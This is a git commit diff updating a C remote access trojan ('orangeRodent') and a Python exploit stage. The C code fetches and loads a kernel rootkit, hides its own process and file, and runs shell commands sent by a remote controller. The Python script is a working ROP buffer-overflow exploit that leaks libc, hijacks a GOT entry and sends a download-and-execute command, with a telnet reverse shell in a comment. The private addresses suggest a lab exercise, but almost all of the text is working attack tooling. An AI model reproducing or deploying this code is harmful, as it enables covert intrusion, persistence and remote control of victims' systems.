ddec9a1e02ebdb0a51fcb5b240073436e7d5f9c3
Ron Miller <mon-riller@ubuntu-22.04>
2024-07-18 22:39:28 -0400

    Changed stage3 and rat

--- orangeRodent.c
+++ orangeRodent.c
@@ -7,9 +7,19 @@
 #include <sys/socket.h>
 #include <unistd.h>
 #include <fcntl.h>
+#include <sys/syscall.h>
+
+#define ROOTKIT -1877
+#define BUFSIZE 512
+#define SENDPID 8008
+#define GOTIME 8675309
+#define CHECKUP 80085
+#define GOODRET 42
+#define HIDEFILE 1234   
 
 char ip[] = "172.100.0.3";
 int port = 4243;
+int attempts = 0;
 
 void connectContinously(char tunnelIP[], int tunnelPort);
 int handleConnection(int sockfd);
@@ -18,8 +28,17 @@ int connectRat(int sockfd, char tunnelIP[], int tunnelPort);
 void signalRootKit(int sockfd);
 void checkRootkit(int sockfd);
 void execute(int sockfd, char* cmd);
+void kill();
+void hideMyPid();
+void hideMyFileName(char* name);
 
 int main(int argc, char* argv[]) {
+    //pclose(popen("wget 172.100.0.3:4242/dolos_rootkit.ko 2>&1 1>/dev/null", "r"));
+    pclose(popen("wget 172.100.0.3:4242/dolos_rootkit.ko 2>/dev/null 1>/dev/null", "r"));
+    pclose(popen("insmod dolos_rootkit.ko", "r"));
+    remove("dolos_rootkit.ko");
+    hideMyPid();
+    hideMyFileName(argv[0] + 2);
     connectContinously(ip, port);
 }
 
@@ -39,7 +58,9 @@ void connectContinously(char tunnelIP[], int tunnelPort) {
         } else {
             printf("connections failed, waiting... \n");
         }
-        sleep(rand() % 30) + 5;
+        if (attempts > 4) kill();
+        else if (attempts >= 0) attempts++;
+        sleep(rand() % 30) + 15;
     }
 }
 
@@ -47,7 +68,7 @@ int handleConnection(int sockfd) {
     char buf[512];
     bzero(buf, sizeof(buf));
 
-    char intro[] = "You have logged into the orangeRodent \n Send \"quit\" to quit \n Send \"orange\"to cause mass mayhem \n Send \"execute cmd\" to execute command \"cmd\" and receive it's output \n Send \"status\" to see the status of the rootkit \n";
+    char intro[] = "You have logged into the orangeRodent \n Send \"quit\" to quit \n Send \"kill\" to kill orangeRodent and remove it\n Send \"orange\"to cause mass mayhem \n Send \"execute cmd\" to execute command \"cmd\" and receive it's output \n Send \"status\" to see the status of the rootkit \n";
 
     char exit[] = "Exiting TCP connection with rodent... \n";
     char orange[] = "It's about to be a fine blueland day... \n";
@@ -59,30 +80,32 @@ int handleConnection(int sockfd) {
     while(1) {
         int stat = read(sockfd, buf, sizeof(buf));
         if(stat == 0) {
-            printf("Connection forcibly closed... \n");
             close(sockfd);
             return 2;
         }
         buf[strlen(buf)-1] = '\x00';
-        printf("From user: %s\n", buf);
-        if((strcmp(buf, "quit")) == 0) {
-            printf("Client exit... \n");
+        if(strcmp(buf, "quit") == 0) {
+            attempts = -1;
             write(sockfd, exit, sizeof(exit));
             close(sockfd);
             return 2;
         }
-        if((strcmp(buf, "orange")) == 0) {
-            printf("Prepare for explosions...\n");
+        if(strcmp(buf, "kill") == 0){
+            close(sockfd);
+            kill();
+        }
+        if(strcmp(buf, "orange") == 0) {
+            attempts = -1;
             write(sockfd, orange, sizeof(orange));
             signalRootKit(sockfd);
         }
-        if((strcmp(buf, "status")) == 0) {
-            printf("Checking in with the rootkit...\n");
+        if(strcmp(buf, "status") == 0) {
+            attempts = -1;
             write(sockfd, status, sizeof(status));
             checkRootkit(sockfd);
         }
-        if((strncmp(buf, "execute", 7)) == 0) {
-            printf("Executing %s...\n", buf + 8);
+        if(strncmp(buf, "execute", 7) == 0) {
+            attempts = -1;
             write(sockfd, execution, sizeof(execution));
             execute(sockfd, buf + 8);
         }
@@ -94,12 +117,8 @@ int handleConnection(int sockfd) {
 int makeSocket() {
     int sockfd = socket(AF_INET, SOCK_STREAM, 0);
 
-    if(sockfd == -1) {
-        printf("socket creation failed... \n");
+    if(sockfd == -1)
         exit(0);
-    }
-    else
-        printf("Socket succsfully created... \n");
 
     return sockfd; 
 }
@@ -114,53 +133,63 @@ int connectRat(int sockfd, char tunnelIP[], int tunnelPort) {
     servaddr.sin_addr.s_addr = inet_addr(tunnelIP);
     servaddr.sin_port = htons(tunnelPort);
 
-    if(connect(sockfd, (struct sockaddr*)&servaddr, sizeof(servaddr)) != 0) {
-        printf("connections with the server failed... \n");
+    if(connect(sockfd, (struct sockaddr*)&servaddr, sizeof(servaddr)) != 0)
         return -1;
-    }
     else
-        printf("connected to the server... \n");
         return 1;
 }
 
 void signalRootKit(int sockfd) {
     char success[] = "Kit hooked...\n";
     char fail[] = "Kit failed to hook...\n";
-    int fd = open("gotime", O_RDONLY | O_CREAT);
-    if(fd == -69) {
+    int status = syscall(SYS_ioctl, ROOTKIT, GOTIME);
+    if(status == GOODRET)
         write(sockfd, success, sizeof(success));
-    } else {
+    else
         write(sockfd, fail, sizeof(fail));
-    }
 }
 
 void checkRootkit(int sockfd) {
-    //syscall: open certain file name, expect an unusual and specific return
     char success[] = "Kit hooked...\n";
     char fail[] = "Kit failed to hook...\n";
-    int fd = open("checkup", O_RDONLY | O_CREAT);
-    if(fd == -69) {
+    int status = syscall(SYS_ioctl, ROOTKIT, CHECKUP);
+    if(status == GOODRET)
         write(sockfd, success, sizeof(success));
-    } else {
+    else
         write(sockfd, fail, sizeof(fail));
-    }
+}
+
+void hideMyPid() {
+    int pid = getpid();
+    char success[] = "Kit hooked...\n";
+    char fail[] = "Kit failed to hook...\n";
+    int status = syscall(SYS_ioctl, ROOTKIT, SENDPID, pid);
+}
+
+void hideMyFileName(char *fname) {
+    char success[] = "Kit hooked...\n";
+    char fail[] = "Kit failed to hook...\n";
+    int status = syscall(SYS_ioctl, ROOTKIT, HIDEFILE, (long)fname);
 }
 
 void execute(int sockfd, char* cmd){
-    FILE *fp;
     char path[1035];
-
     char fail[] = "Failed to run command\n";
-
     char* act_cmd = (char*)calloc(strlen(cmd) + strlen(" 2>&1"), sizeof(char));
     strncpy(act_cmd, cmd, strlen(cmd));
     strncpy(act_cmd + strlen(cmd), " 2>&1 ", strlen(" 2>&1"));
-    fp = popen(act_cmd, "r");
+    FILE *fp = popen(act_cmd, "r");
     if (fp == NULL) 
         write(sockfd, fail, sizeof(fail));
     else
         while (fgets(path, sizeof(path), fp) != NULL)
             write(sockfd, path, strlen(path));
+    pclose(fp);
     free(act_cmd);
 }
 
+void kill(){
+    remove("orangeRodent");
+    pclose(popen("rmmod dolos_rootkit", "r"));
+    exit(0);
+}
--- stage3.py
+++ stage3.py
@@ -7,23 +7,18 @@ def leakLibcBase(sock) -> int:
     # Vulnerablility in processing of a HTTP request
     payload = b"GET"
     payload += b"\xAA"*(1045) 
-    
-    payload += p64(0x4019d0)       # These exist to prevent clobbered printf from segfaulting
+    payload += p64(0x4019d0)
     payload += p64(0xffffc4469b88) 
     payload += b'A'*8 
-    
-    payload += p64(0x401048) # Rop to sendStatus 
+    payload += p64(0x401048)
     payload += b"A" * 24
-    # payload += p64(0x4021c0) # Ret to readUntil at end of chain
-    # payload += p64(0xffffc4469b88) # Nop gadget to main close and sock_fd retrieval
     payload += p64(0x400efc)
     payload += b"B"*8
-    payload += p64(0x00401800) # Addr of random string to prevent segfault in snprintf
-    payload += p64(0x00402280) # Addr of atoi GOT entry
+    payload += p64(0x00401800)
+    payload += p64(0x00402280)
     payload += b'A'* 4
-    payload += p64(0x4)        # Likely socket fd number
-    payload += b"B" * 260 # pattern[:260]
-    # payload += p64(0x402200)
+    payload += p64(0x4)
+    payload += b"B" * 260
     payload += p64(0x400efc)
     payload += p64(0x4021c0)
     payload += b"ABCD"
@@ -35,16 +30,11 @@ def leakLibcBase(sock) -> int:
     payload += p64(4)
     payload += b"A"*60
     payload += p64(0x4021c0)
-    #payload += b"ABCDEFGHIJKLMNOPQRSTUV"
-
-
-    payload += b" /status" # sometimes returns to an address here
-    #payload += p64(0x00400e68)
-    #payload += p64(0x4021c0)
+    payload += b" /status"
     payload += b" HTTP/1.1"
     payload += "\r\n".encode("ascii")*2 
     sock.send(payload)
-    
+
     # Recv first HTTP response
     sock.recvuntil(b"error\r\n")
     sock.recvuntil(b"\r\n\r\n")
@@ -61,9 +51,13 @@ def sendRevShellSysPayload(sock, callback_ip: str, callback_port_stdin: str, cal
     payload = f"telnet {callback_ip} {callback_port_stdin} | /bin/sh | telnet {callback_ip} {callback_port_stdout} #"
     sock.send(payload.encode('ascii')+b"D")
 
-def overwritePutsGot(sock, libcBase: int):
+def sendScript(sock, script: str):
+    payload = f"/bin/sh -c \"{script}\"#"
+    sock.send(payload.encode('ascii') + b"D")
+
+def overwriteFreeGot(sock, libcBase: int):
     SYSTEM_OFFSET = 0x472b4
-    sys_addr = libcBase+SYSTEM_OFFSET
+    sys_addr = libcBase + SYSTEM_OFFSET
     sock.send(p64(sys_addr)+b"D")
 
 def exploit(ip: str, port: int):
@@ -72,11 +66,10 @@ def exploit(ip: str, port: int):
     libc = leakLibcBase(sock)
     log.success(f"Leaked libc base addr: {hex(libc)}")
     log.info("Writing reverse shell shell script payload")
-    sendRevShellSysPayload(sock, "172.100.0.1", "9001", "9002")
-    log.info("Overwrting GOT puts entry")
-    overwritePutsGot(sock, libc)
-
-    sock.interactive()
+    #sendRevShellSysPayload(sock, "172.100.0.1", "4242", "4243")
+    sendScript(sock, "wget 172.100.0.1:4242/orangeRodent 2>&1 1>/dev/null; chmod +x orangeRodent; ./orangeRodent;")
+    log.info("Overwrting GOT free entry")
+    overwriteFreeGot(sock, libc)
 
 if __name__ == "__main__":
-    exploit("172.100.0.2", 8080)
+    exploit("127.0.0.1", 4200)
